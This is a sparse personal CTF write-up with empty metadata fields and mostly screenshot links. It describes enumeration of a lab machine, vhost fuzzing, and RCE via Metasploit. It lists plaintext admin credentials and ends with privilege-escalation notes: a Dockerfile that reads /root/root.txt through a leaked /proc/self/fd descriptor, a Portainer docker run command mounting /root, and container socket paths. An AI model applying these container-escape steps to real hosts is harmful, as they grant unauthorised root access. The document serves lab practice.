# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
Creds
- ` city_adminHl5H : Main_password!!** `

## External
### Enumeration
- There are 3 ports open, but port 80 doesnt have anything except static website.
	- ![](https://i.imgur.com/KGxciUT.png)
- on Port 8000
	- ![](https://i.imgur.com/3B0XY8E.png)
	- ![](https://i.imgur.com/15NdC1p.png)
	- ![](https://i.imgur.com/jEbKsiJ.png)
- ![](https://i.imgur.com/2gksyd3.png)
- Tried many Fuzzes, Directory subdomain but it worked on VHOST. ![](https://i.imgur.com/LvlNvS5.png)
- ![](https://i.imgur.com/WEScebX.png)	
### Gaining Access
- Searched for the version
	- ![](https://i.imgur.com/kQeniOM.png)
- ![](https://i.imgur.com/gh7BnVb.png)
- ` city_adminFoN8 : Main_password!!** `
- I Got RCE with Metasploit.![](https://i.imgur.com/NE9bzkn.png)
	- ![](https://i.imgur.com/641DpAg.png)
## Internal
### Enumeration

![](https://i.imgur.com/9Ta9Lmr.png)
- ![](https://i.imgur.com/vQ9GJwL.png)

![](https://i.imgur.com/AWInaLe.png)

![](https://i.imgur.com/9GqOWbP.png)

### Gaining Access


### Maintaining Access
![](https://i.imgur.com/mSy0k9Q.png)

![](https://i.imgur.com/98BZnrY.png)

![](https://i.imgur.com/UrgiKqY.png)

- Matthew Password ???
- ![](https://i.imgur.com/yMWWxEZ.png)
```shell
FROM ubuntu:latest 
WORKDIR /proc/self/fd/8
RUN cat ../../../../root/root.txt
```
![](https://i.imgur.com/HoLNBxK.png)

# Random Notes
```c
# Use the official Node.js 14 image as the base image 
FROM node:14 

# Set the working directory in the container 

WORKDIR /app 

# Copy package.json and package-lock.json (if available) 

COPY package*.json ./ 

# Install dependencies 

RUN npm install 

# Copy the rest of the application code 

COPY . . 

# Expose the port the app runs on 

EXPOSE 3000 # Define the command to run the app when the container starts 

CMD ["node", "app.js"]
```



	/opt/portainer/docker run --name rexder -v /root:/app/tmp -p 3000:3000 reximg

/run/containerd/s/e73bf0677d4a30dac92eede230d9dab11ded408173c5f142d9455af9278da302
/run/containerd/containerd.sock.ttrpc
/run/docker.sock



https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/